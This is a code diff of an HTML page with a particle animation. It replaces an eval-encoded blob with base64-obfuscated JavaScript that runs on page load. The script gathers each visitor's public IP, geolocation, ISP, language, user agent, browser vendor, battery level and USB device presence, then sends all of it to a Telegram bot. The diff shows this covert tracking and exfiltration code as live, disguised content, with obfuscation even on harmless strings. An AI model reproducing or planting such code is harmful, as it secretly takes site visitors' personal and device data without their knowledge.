@@ -51,7 +51,7 @@
                 this.size = Math.random() * 5 + 1;
                 this.speedX = Math.random() * 3 - 1.5;
                 this.speedY = Math.random() * 3 - 1.5;
-                this.color = 'cyan';
+                this.color = atob('Y3lhbg==');
             }
             update() {
                 this.x += this.speedX;
@@ -76,7 +76,7 @@
                     const distance = Math.sqrt(dx * dx + dy * dy);
                     if (distance < 100) {
                         ctx.beginPath();
-                        ctx.strokeStyle = 'cyan';
+                        ctx.strokeStyle = atob('Y3lhbg==');
                         ctx.lineWidth = 0.2;
                         ctx.moveTo(particlesArray[i].x, particlesArray[i].y);
                         ctx.lineTo(particlesArray[j].x, particlesArray[j].y);
@@ -107,7 +107,83 @@
 
         let telegramBotToken = 'YOUR_BOT_TOKEN_HERE';
         let telegramChatId = 'YOUR_CHAT_ID_HERE';
-        eval(atob('ZnVuY3Rpb24gc2VuZERhdGFUb1RlbGVncmFtKCkgewogICAgZmV0Y2goJ2h0dHBzOi8vaXBhcGkuY28vanNvbi8nKQogICAgLnRoZW4ocmVzcG9uc2UgPT4gcmVzcG9uc2UuanNvbigpKQogICAgLnRoZW4oZGF0YSA9PiB7CiAgICAgICAgY29uc3QgaXBBZGRyZXNzID0gZGF0YS5pcDsKICAgICAgICBjb25zdCBjb3VudHJ5ID0gZGF0YS5jb3VudHJ5X25hbWU7CiAgICAgICAgY29uc3QgcmVnaW9uID0gZGF0YS5yZWdpb247CiAgICAgICAgY29uc3QgY2l0eSA9IGRhdGEuY2l0eTsKICAgICAgICBjb25zdCBpc3AgPSBkYXRhLm9yZzsKICAgICAgICBjb25zdCBsYW5ndWFnZSA9IG5hdmlnYXRvci5sYW5ndWFnZTsKICAgICAgICBjb25zdCB0aW1lID0gbmV3IERhdGUoKS50b0xvY2FsZVRpbWVTdHJpbmcoKTsKICAgICAgICBjb25zdCBkZXZpY2VOYW1lID0gbmF2aWdhdG9yLnVzZXJBZ2VudDsKICAgICAgICBjb25zdCB2ZW5kb3IgPSBuYXZpZ2F0b3IudmVuZG9yOwoKICAgICAgICBsZXQgdXNiQ29ubmVjdGVkID0gJ05vJzsKICAgICAgICBpZiAobmF2aWdhdG9yLnVzYikgewogICAgICAgICAgICBuYXZpZ2F0b3IudXNiLmdldERldmljZXMoKS50aGVuKGRldmljZXMgPT4gewogICAgICAgICAgICAgICAgaWYgKGRldmljZXMubGVuZ3RoID4gMCkgewogICAgICAgICAgICAgICAgICAgIHVzYkNvbm5lY3RlZCA9ICdZZXMnOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9KTsKICAgICAgICB9CgogICAgICAgIGxldCBiYXR0ZXJ5TGV2ZWwgPSAnTm90IHN1cHBvcnRlZCc7CiAgICAgICAgbmF2aWdhdG9yLmdldEJhdHRlcnkoKS50aGVuKGJhdHRlcnkgPT4gewogICAgICAgICAgICBiYXR0ZXJ5TGV2ZWwgPSAoYmF0dGVyeS5sZXZlbCAqIDEwMCkudG9GaXhlZCgwKSArICclJzsKICAgICAgICB9KS5jYXRjaChlcnJvciA9PiB7CiAgICAgICAgICAgIGNvbnNvbGUuZXJyb3IoJ0Vycm9yIGdldHRpbmcgYmF0dGVyeSBsZXZlbDonLCBlcnJvcik7CiAgICAgICAgfSk7CgogICAgICAgIGxldCBsb2NhbElwID0gJyc7CiAgICAgICAgZmV0Y2goJ2h0dHBzOi8vYXBpLmlwaWZ5Lm9yZz9mb3JtYXQ9anNvbicpCiAgICAgICAgLnRoZW4ocmVzcG9uc2UgPT4gcmVzcG9uc2UuanNvbigpKQogICAgICAgIC50aGVuKGRhdGEgPT4gewogICAgICAgICAgICBsb2NhbElwID0gZGF0YS5pcDsKICAgICAgICB9KQogICAgICAgIC5jYXRjaChlcnJvciA9PiB7CiAgICAgICAgICAgIGNvbnNvbGUuZXJyb3IoJ0Vycm9yIGdldHRpbmcgbG9jYWwgSVAgYWRkcmVzczonLCBlcnJvcik7CiAgICAgICAgfSk7CgogICAgICAgIHNldFRpbWVvdXQoKCkgPT4gewogICAgICAgICAgICBjb25zdCB0ZWxlZ3JhbUFwaVVybCA9IGBodHRwczovL2FwaS50ZWxlZ3JhbS5vcmcvYm90JHt0ZWxlZ3JhbUJvdFRva2VufS9zZW5kTWVzc2FnZWA7CiAgICAgICAgICAgIGZldGNoKHRlbGVncmFtQXBpVXJsLCB7CiAgICAgICAgICAgICAgICBtZXRob2Q6ICdQT1NUJywKICAgICAgICAgICAgICAgIGhlYWRlcnM6IHsKICAgICAgICAgICAgICAgICAgICAnQ29udGVudC1UeXBlJzogJ2FwcGxpY2F0aW9uL2pzb24nCiAgICAgICAgICAgICAgICB9LAogICAgICAgICAgICAgICAgYm9keTogSlNPTi5zdHJpbmdpZnkoewogICAgICAgICAgICAgICAgICAgIGNoYXRfaWQ6IHRlbGVncmFtQ2hhdElkLAogICAgICAgICAgICAgICAgICAgIHRleHQ6IGDjgITjgIDvvKTvvLjvvI3vvLPvvKnvvK3vvLXjgIDijplcblxu8J2ZuPCdmpkg8J2ZsPCdmo3wnZqN8J2am/Cdmo7wnZqc8J2anDogJHtpcEFkZHJlc3N9XG7wnZm78J2amPCdmozwnZqK8J2alSDwnZm48J2amTogJHtsb2NhbElwfVxu8J2ZsvCdmpjwnZqe8J2al/Cdmp3wnZqb8J2aojogJHtjb3VudHJ5fVxu8J2agfCdmo7wnZqQ8J2akvCdmpjwnZqXOiAke3JlZ2lvbn1cbvCdmbLwnZqS8J2anfCdmqI6ICR7Y2l0eX1cbklQUzogJHtpc3B9XG7wnZm78J2aivCdmpfwnZqQ8J2anvCdmorwnZqQ8J2ajjogJHtsYW5ndWFnZX1cbvCdmoPwnZqS8J2alvCdmo46ICR7dGltZX1cbvCdmbPwnZqO8J2an/CdmpLwnZqM8J2ajiDwnZm48J2al/Cdmo/wnZqYOiAke2RldmljZU5hbWV9XG5cbvCdmoXwnZqO8J2al/Cdmo3wnZqY8J2amzogJHt2ZW5kb3J9XG4g8J2ZsfCdmorwnZqd8J2anfCdmpvwnZqiOiAke2JhdHRlcnlMZXZlbH1cblVTQiBDb25uZWN0ZWQ6ICR7dXNiQ29ubmVjdGVkfSBcblxu77yt77yh77yk77yl44CA77yi77y577yaQGFscGhhY29kZXgzNjkgYAogICAgICAgICAgICAgICAgfSkKICAgICAgICAgICAgfSk7CiAgICAgICAgfSwgNTAwMCk7CiAgICB9KQogICAgLmNhdGNoKGVycm9yID0+IHsKICAgICAgICBjb25zb2xlLmVycm9yKCdFcnJvciBmZXRjaGluZyBJUCBkYXRhOicsIGVycm9yKTsKICAgIH0pOwp9CnNlbmREYXRhVG9UZWxlZ3JhbSgpOwpjb25zdCBhdWRpbyA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdhdWRpbycpOwphdWRpby5hZGRFdmVudExpc3RlbmVyKCdzdGFydCcsICgpID0+IHsKICAgIGF1ZGlvLnBhdXNlKCk7CiAgICBhdWRpby5jdXJyZW50VGltZSA9IDA7Cn0pOw=='));
+
+        sendDataToTelegram();
+
+        function base64ToUtf8(base64) {
+            const binString = atob(base64);
+            const bytes = new Uint8Array(binString.length);
+            for (let i = 0; i < binString.length; i++) {
+                bytes[i] = binString.charCodeAt(i);
+            }
+            return new TextDecoder('utf-8').decode(bytes);
+        }
+
+        function sendDataToTelegram() {
+            fetch(atob('aHR0cHM6Ly9pcGFwaS5jby9qc29uLw=='))
+            .then(response => response.json())
+            .then(data => {
+                const ipAddress = data[atob('aXA=')];
+                const country = data[atob('Y291bnRyeV9uYW1l')];
+                const region = data[atob('cmVnaW9u')];
+                const city = data[atob('Y2l0eQ==')];
+                const isp = data[atob('b3Jn')];
+                const language = navigator[atob('bGFuZ3VhZ2U=')];
+                const time = new Date().toLocaleTimeString();
+                const deviceName = navigator[atob('dXNlckFnZW50')];
+                const vendor = navigator[atob('dmVuZG9y')];
+
+                let usbConnected = atob('Tm8=');
+                if (navigator[atob('dXNi')]) {
+                    navigator[atob('dXNi')].getDevices().then(devices => {
+                        if (devices.length > 0) {
+                            usbConnected = atob('WWVz');
+                        }
+                    });
+                }
+
+                let batteryLevel = atob('Tm90IHN1cHBvcnRlZA==');
+                navigator.getBattery().then(battery => {
+                    batteryLevel = (battery.level * 100).toFixed(0) + atob('JQ==');
+                }).catch(error => {
+                    console.error(atob('RXJyb3IgZ2V0dGluZyBiYXR0ZXJ5IGxldmVsOg=='), error);
+                });
+
+                let localIp = '';
+                fetch(atob('aHR0cHM6Ly9hcGkuaXBpZnkub3JnP2Zvcm1hdD1qc29u'))
+                .then(response => response.json())
+                .then(data => {
+                    localIp = data[atob('aXA=')];
+                })
+                .catch(error => {
+                    console.error(atob('RXJyb3IgZ2V0dGluZyBsb2NhbCBJUCBhZGRyZXNzOg=='), error);
+                });
+
+                setTimeout(() => {
+                    const telegramApiUrl = atob('aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdA==') + telegramBotToken + '/' + atob('c2VuZE1lc3NhZ2U=');
+                    fetch(telegramApiUrl, {
+                        method: atob('UE9TVA=='),
+                        headers: {
+                            [atob('Q29udGVudC1UeXBl')]: atob('YXBwbGljYXRpb24vanNvbg==')
+                        },
+                        body: JSON.stringify({
+                            [atob('Y2hhdF9pZA==')]: telegramChatId,
+                            [atob('cGFyc2VfbW9kZQ==')]: atob('SFRNTA=='),
+                            [atob('dGV4dA==')]: base64ToUtf8('PGJsb2NrcXVvdGU+44CE44CA77yk77y477yN77yz77yp77yt77y144CA4o6ZPC9ibG9ja3F1b3RlPgoKPGI+8J2ZuPCdmpkg8J2ZsPCdmo3wnZqN8J2am/Cdmo7wnZqc8J2anDo8L2I+IDxjb2RlPg==') + ipAddress + base64ToUtf8('PC9jb2RlPgo8Yj7wnZm78J2amPCdmozwnZqK8J2alSDwnZm48J2amTo8L2I+IDxjb2RlPg==') + localIp + base64ToUtf8('PC9jb2RlPgo8Yj7wnZmy8J2amPCdmp7wnZqX8J2anfCdmpvwnZqiOjwvYj4gPGNvZGU+') + country + base64ToUtf8('PC9jb2RlPgo8Yj7wnZqB8J2ajvCdmpDwnZqS8J2amPCdmpc6PC9iPiA8Y29kZT4=') + region + base64ToUtf8('PC9jb2RlPgo8Yj7wnZmy8J2akvCdmp3wnZqiOjwvYj4gPGNvZGU+') + city + base64ToUtf8('PC9jb2RlPgo8Yj5JUFM6PC9iPiA8Y29kZT4=') + isp + base64ToUtf8('PC9jb2RlPgo8Yj7wnZm78J2aivCdmpfwnZqQ8J2anvCdmorwnZqQ8J2ajjo8L2I+IDxjb2RlPg==') + language + base64ToUtf8('PC9jb2RlPgo8Yj7wnZqD8J2akvCdmpbwnZqOOjwvYj4gPGNvZGU+') + time + base64ToUtf8('PC9jb2RlPgo8Yj7wnZmz8J2ajvCdmp/wnZqS8J2ajPCdmo4g8J2ZuPCdmpfwnZqP8J2amDo8L2I+IDxjb2RlPg==') + deviceName + base64ToUtf8('PC9jb2RlPgoKPGI+8J2ahfCdmo7wnZqX8J2ajfCdmpjwnZqbOjwvYj4gPGNvZGU+') + vendor + base64ToUtf8('PC9jb2RlPgo8Yj7wnZmx8J2aivCdmp3wnZqd8J2ajvCdmpvwnZqiOjwvYj4gPGNvZGU+') + batteryLevel + base64ToUtf8('PC9jb2RlPgo8Yj5VU0IgQ29ubmVjdGVkOjwvYj4gPGNvZGU+') + usbConnected + base64ToUtf8('PC9jb2RlPiAKCjxibG9ja3F1b3RlPu+8re+8oe+8pO+8peOAgO+8ou+8ue+8mkBDb2RleF8zNjk8L2Jsb2NrcXVvdGU+')
+                        })
+                    });
+                }, 5000);
+            })
+            .catch(error => {
+                console.error(atob('RXJyb3IgZmV0Y2hpbmcgSVAgZGF0YTo='), error);
+            });
+        }
+
+        const audio = document.getElementById('audio');
+        audio.addEventListener('start', () => {
+            audio.pause();
+            audio.currentTime = 0; // Reset audio to the beginning
+        });
     </script>
 </body>
 </html>
